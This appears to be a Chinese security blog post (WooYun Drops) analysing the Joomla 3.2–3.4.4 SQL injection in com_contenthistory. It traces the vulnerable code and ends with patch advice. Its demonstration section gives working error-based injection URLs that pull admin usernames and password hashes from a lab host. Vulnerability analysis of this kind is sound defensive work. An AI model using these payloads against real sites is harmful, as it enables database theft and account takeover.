@@ -1,0 +1,139 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Joomla CMS 3.2-3.4.4 SQL注入 漏洞分析</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">RickGray</a> <span class="bull">·</span> <time title="2015/10/26 11:24" ui-time="" datetime="2015/10/26 11:24" class="published ng-binding ng-isolate-scope">2015/10/26 11:24</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>昨日，Joomla CMS发布新版本3.4.5，该版本修复了一个高危的SQL注入漏洞，3.2至3.4.4版本都受到影响。攻击者通过该漏洞可以直接获取获取数据库中敏感信息，甚至可以获取已登陆的管理员会话直接进入网站后台。</p><h1>0x01 原理分析</h1><hr><p>在 Joomla CMS 中有一个查看历史编辑版本的组件(com_contenthistory)，该功能本应只有管理员才能访问，但是由于开发人员的疏忽，导致该功能的访问并不需要相应的权限。通过访问 <code>/index.php?option=com_contenthistory</code> 可以使得服务端加载历史版本处理组件。程序流程会转到 <code>/components/com_contenthistory/contenthistory.php</code> 文件中：</p><pre><code>#!php
+&lt;?php
+defined('_JEXEC') or die;    
+
+$lang = JFactory::getLanguage();
+$lang-&gt;load('com_contenthistory', JPATH_ADMINISTRATOR, null, false, true)
+||    $lang-&gt;load('com_contenthistory', JPATH_SITE, null, false, true);    
+
+require_once JPATH_COMPONENT_ADMINISTRATOR . '/contenthistory.php';
+</code></pre><p>可以看到该组件加载时并没有进行相关权限的监测，而 Joomla 中，一般的后台调用组件 (<code>/administrator/components/</code>下的组件) 都会进行组件对应的权限检查，例如后台中的 <code>com_contact</code> 组件</p><pre><code>#!php
+if (!JFactory::getUser()-&gt;authorise('core.manage', 'com_contact'))
+{
+    return JError::raiseWarning(404, JText::_('JERROR_ALERTNOAUTHOR'));
+}
+</code></pre><p>但是，程序在处理 <code>contenthistory</code> 组件时，并没有进行一个权限检查，程序初始化并设置好组件相关配置后，包含文件 <code>/administrator/components/com_contenthistory/contenthistory.php</code>，其内容如下：</p><pre><code>#!php
+&lt;?php
+defined('_JEXEC') or die;    
+
+$controller = JControllerLegacy::getInstance('Contenthistory', array('base_path' =&gt; JPATH_COMPONENT_ADMINISTRATOR));
+$controller-&gt;execute(JFactory::getApplication()-&gt;input-&gt;get('task'));
+$controller-&gt;redirect();
+</code></pre><p>程序初始化基于 <code>contenthistory</code> 组件的控制类 <code>JControllerLegacy</code>，然后直接调用控制类的 <code>execute()</code> 方法，在 <code>execute()</code> 方法中，会调用其控制类中的 <code>display()</code>，代码位于 <code>/libraries/legacy/controller/legacy.php</code>：</p><pre><code>#!php
+public function display($cachable = false, $urlparams = array())
+{
+    $document = JFactory::getDocument();
+    $viewType = $document-&gt;getType();
+    $viewName = $this-&gt;input-&gt;get('view', $this-&gt;default_view);
+    $viewLayout = $this-&gt;input-&gt;get('layout', 'default', 'string');    
+
+    $view = $this-&gt;getView($viewName, $viewType, '', array('base_path' =&gt; $this-&gt;basePath, 'layout' =&gt; $viewLayout));    
+
+    // Get/Create the model
+    if ($model = $this-&gt;getModel($viewName))
+    {
+        // Push the model into the view (as default)
+        $view-&gt;setModel($model, true);
+    }
+    (...省略...)
+    if ($cachable &amp;&amp; $viewType != 'feed' &amp;&amp; $conf-&gt;get('caching') &gt;= 1)
+    { (...省略...) }
+    else
+    {
+        $view-&gt;display();
+    }    
+
+    return $this;
+}
+</code></pre><p>处理程序从传递的参数中获取 <code>view</code> 和 <code>layout</code> 的参数值进行初始化视图，并且调用 <code>$model = $this-&gt;getModel($viewName)</code> 加载对应数据模型，最终会调用 <code>$view-&gt;display()</code> 函数进行视图处理。</p><p>Joomla 新版本 3.4.5 中修复的SQL注入漏洞涉及的是历史查看操作，也就是 <code>view=history</code> 时的程序处理会导致注入。在程序进行数据提取时，会进入 <code>/administrator/components/com_contenthistory/models/history.php</code> 文件中的 <code>getListQuery()</code> 函数：</p><pre><code>#!php
+protected function getListQuery()
+{
+    // Create a new query object.
+    $db = $this-&gt;getDbo();
+    $query = $db-&gt;getQuery(true);    
+
+    // Select the required fields from the table.
+    $query-&gt;select(
+        $this-&gt;getState(
+            'list.select',
+            'h.version_id, h.ucm_item_id, h.ucm_type_id, h.version_note, h.save_date, h.editor_user_id,' .
+            'h.character_count, h.sha1_hash, h.version_data, h.keep_forever'
+        )
+    )
+    -&gt;from($db-&gt;quoteName('#__ucm_history') . ' AS h')
+    -&gt;where($db-&gt;quoteName('h.ucm_item_id') . ' = ' . $this-&gt;getState('item_id'))
+    -&gt;where($db-&gt;quoteName('h.ucm_type_id') . ' = ' . $this-&gt;getState('type_id'))    
+
+    // Join over the users for the editor
+    -&gt;select('uc.name AS editor')
+    -&gt;join('LEFT', '#__users AS uc ON uc.id = h.editor_user_id');    
+
+    // Add the list ordering clause.
+    $orderCol = $this-&gt;state-&gt;get('list.ordering');
+    $orderDirn = $this-&gt;state-&gt;get('list.direction');
+    $query-&gt;order($db-&gt;quoteName($orderCol) . $orderDirn);    
+
+    return $query;
+}
+</code></pre><p>注意下面这段SQL语句构造部分：</p><pre><code>#!php
+    $query-&gt;select(
+        $this-&gt;getState(
+            'list.select',
+            'h.version_id, h.ucm_item_id, h.ucm_type_id, h.version_note, h.save_date, h.editor_user_id,' .
+            'h.character_count, h.sha1_hash, h.version_data, h.keep_forever'
+        )
+    )
+    -&gt;from($db-&gt;quoteName('#__ucm_history') . ' AS h')
+    -&gt;where($db-&gt;quoteName('h.ucm_item_id') . ' = ' . $this-&gt;getState('item_id'))
+    -&gt;where($db-&gt;quoteName('h.ucm_type_id') . ' = ' . $this-&gt;getState('type_id'))
+</code></pre><p>其中 <code>getState()</code> 函数用于获取模型的属性和其对应的值，其函数定义位于 <code>/ibraries/legacy/model/legacy.php</code>：</p><pre><code>#!php
+public function getState($property = null, $default = null)
+{
+    if (!$this-&gt;__state_set)
+    {
+        // Protected method to auto-populate the model state.
+        $this-&gt;populateState();    
+
+        // Set the model state set flag to true.
+        $this-&gt;__state_set = true;
+    }    
+
+    return $property === null ? $this-&gt;state : $this-&gt;state-&gt;get($property, $default);
+}
+</code></pre><p>然后会调用 <code>populateState()</code> 函数来初始化参数值和提取并过滤某些参数，在 <code>contenthistory</code> 组建中定义有自己的 <code>populateState()</code> 函数：</p><pre><code>#!php
+protected function populateState($ordering = null, $direction = null)
+{
+    (...省略...)
+    // List state information.
+    parent::populateState('h.save_date', 'DESC');
+}
+</code></pre><p>函数最后，会调用父类的 <code>populateState()</code> 函数，因为该数据模型继承于 JModelList，所以父类相关代码位于 <code>/libraries/legacy/model/list.php</code> 中，而在父类该函数的处理中会解析请求中传递的 <code>list[]</code> 参数，解析并过滤预设键的值，但是却忽略了 <code>list[select]</code>：</p><pre><code>#!php
+protected function populateState($ordering = null, $direction = null)
+{
+    (...省略...)
+        // Receive &amp; set list options
+        if ($list = $app-&gt;getUserStateFromRequest($this-&gt;context . '.list', 'list', array(), 'array'))
+        {
+            foreach ($list as $name =&gt; $value)
+            {
+                // Extra validations
+                switch ($name)
+                {
+                    case 'fullordering':
+                        (...省略...)
+                    case 'ordering':
+                        (...省略...)
+                    case 'direction':
+                        (...省略...)
+                    case 'limit':
+                        (...省略...)
+                    default:
+                        $value = $value;
+                        break;
+                }    
+
+                $this-&gt;setState('list.' . $name, $value);
+            }
+        }
+    (...省略...)
+</code></pre><p>而传递 <code>list[select]</code> 参数值最终会被解析到上述组件视图进行处理时 SQL 语句构建中的 <code>list.select</code> 里，从而导致了注入。</p><h1>0x02 漏洞演示</h1><hr><p>通过上面简单的分析，已经知道了受影响的 Joomla 版本中，<code>contenthistory</code> 组件访问不受权限的控制，并且当进行 <code>view=history</code> 请求时会解析请求参数中 <code>list[select]</code> 的值拼接到 SQL 语句中。下面是该漏洞的简单验证和利用方法。</p><p><em>1.漏洞验证</em></p><blockquote><p>http://http://172.16.96.130/xampp/Joomla-3.4.4/index.php?option=com_contenthistory&amp;view=history&amp;list[select]=1</p></blockquote><p>因为在进行 SQL 语句拼接的时候，获取了 <code>list.ordering</code> 进行数据查询中的 <code>order</code> 操作，若不提供默认会将其设置为数据进行处理，相关处理位于 <code>/libraries/joomla/database/driver.php</code> 的 quoteName() 函数中。</p><p>因此，访问上述构造的URL，服务器会报错：</p><p><img alt="" img-src="d1bd8bf075d60f56670c45e2e757f9e3c8258a81.jpg"></p><p><em>2.漏洞利用</em></p><p>因为在 SQL 语句拼接时，程序框架针对每个 <code>from</code> 或者 <code>where</code> 操作进行了换行处理，所以这里并不能使用 <code>#</code>、<code>--</code> 等符号来注释掉后面的语句，只能通过报错注入进行数据提取。但是语句的成功执行有一定的前提条件，也就是传递的 <code>item_id</code> 和 <code>type_id</code> 参数值必须于数据库中有效，同时传递 <code>list[ordering]</code> 参数 (空值即可)，这样注入的语句才能够得到执行，从而进行报错注入。</p><p>这里经过多个漏洞站点的测试可以简单的使用 <code>item_id=1&amp;type_id=1</code>，当然了为了准确性和有效性，可以通过爆破的方式来得到这两个参数的有效值，然后再进行注入操作。</p><p>(Tips：Joomla 中构造的 SQL 语句中 <code>#_</code> 最终会在执行前被替换为表前缀)</p><p>下面是获取用户名/密码哈希的漏洞演示过程：</p><blockquote><p>http://http://172.16.96.130/xampp/Joomla-3.4.4/index.php?option=com&#95;contenthistory&amp;view=history&amp;item&#95;id=1&amp;type_id=1&amp;list[ordering]&amp;list[select]=(select 1 from (select count(<em>),concat((select username from %23__users limit 0,1),floor(rand(0)</em>2)) from information_schema.tables group by 2)x)</p></blockquote><p><img alt="" img-src="b6e0c9a20e968ba47bb3bdbee96aa2059f42f519.jpg"></p><blockquote><p>http://172.16.96.130/xampp/Joomla-3.4.4/index.php?option=com&#95;contenthistory&amp;view=history&amp;item&#95;id=1&amp;type_id=1&amp;list[ordering]&amp;list[select]=(select 1 from (select count(<em>),concat((select password from %23__users limit 0,1),floor(rand(0)</em>2)) from information_schema.tables group by 2)x)</p></blockquote><p><img alt="" img-src="552541a7fb69b74ee212bf80dba575af24ca25f2.jpg"></p><h1>0x03 修复方案</h1><hr><ol><li>从 <a href="https://github.com/joomla/joomla-cms/releases">https://github.com/joomla/joomla-cms/releases</a> 获取最新版本进行重新安装；</li><li>从 <a href="https://github.com/joomla/joomla-cms/releases">https://github.com/joomla/joomla-cms/releases</a> 下载相应版本的补丁程序进行升级；</li></ol><h1>0x04 总结</h1><hr><p>就 Joomla CMS 的用户量来看，目前还有大量的站点的数据正受到该漏洞的威胁。该漏洞的产生本质上是由于访问控制的缺失和过滤不严格造成。访问控制的缺失导致本应只有管理员才能进行访问和加载的 <code>contenthistory</code> 组件能够被任意用户访问和加载，而参数的过滤不严格，导致攻击者能够构造出恶意的参数到执行流中产生注入。</p><h1>0x05 参考</h1><ul><li><a href="http://www.sebug.net/vuldb/ssvid-89680">http://www.sebug.net/vuldb/ssvid-89680</a></li><li><a href="https://blog.sucuri.net/2015/10/joomla-3-4-5-released-fixing-a-serious-sql-injection-vulnerability.html">https://blog.sucuri.net/2015/10/joomla-3-4-5-released-fixing-a-serious-sql-injection-vulnerability.html</a></li><li><a href="https://www.trustwave.com/Resources/SpiderLabs-Blog/Joomla-SQL-Injection-Vulnerability-Exploit-Results-in-Full-Administrative-Access/">https://www.trustwave.com/Resources/SpiderLabs-Blog/Joomla-SQL-Injection-Vulnerability-Exploit-Results-in-Full-Administrative-Access/</a></li></ul><p>原文地址：<a href="http://blog.knownsec.com/2015/10/joomla-cms-3-2-3-4-4-sql-injection-vulnerability/">http://blog.knownsec.com/2015/10/joomla-cms-3-2-3-4-4-sql-injection-vulnerability/</a></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="donate" style="padding:10px;border-top:1px solid #d9d9d9;text-align:center"><span>碎银子打赏，作者好攒钱娶媳妇：</span><br><br><img src="http://static.wooyun.org/wooyun/upload/donate/20160229102335edc9f9b0adc0d0c871c297da5deb1bee.png" style="width:200px;height:200px"></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/11371" rel="bookmark" id="re1">Joomla 对象注入漏洞分析报告</a></li><li><a href="http://drops.wooyun.org/tips/288" rel="bookmark" id="re2">攻击JavaWeb应用[4]-SQL注入[2]</a></li><li><a href="http://drops.wooyun.org/tips/748" rel="bookmark" id="re3">Hibernate对注入的简单测试</a></li><li><a href="http://drops.wooyun.org/papers/979" rel="bookmark" id="re4">DedeCMS最新通杀注入(buy_action.php)漏洞分析</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">RickGray</span> <span class="reply-time">2016-02-19 11:21:54</span></div><p></p><p>文中有些内容好像页面解析的时候被吃掉了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xiaoL</span> <span class="reply-time">2015-11-06 15:45:43</span></div><p></p><p>@RickGray<br>另外# 没有变成表前缀<br>求告知=-=</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xiaoL</span> <span class="reply-time">2015-11-06 15:40:20</span></div><p></p><p>测试一下*<br>星号是你没写还是被过滤了。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">许安</span> <span class="reply-time">2015-10-27 18:16:46</span></div><p></p><p>能问下这个密码怎么解密吗？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">一本正经</span> <span class="reply-time">2015-10-27 09:49:02</span></div><p></p><p>有理有据，令人信服。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">君莫笑</span> <span class="reply-time">2015-10-26 16:28:54</span></div><p></p><p>b哥写得真不错啊啊</p><p></p></div></div></div></div></div></main>
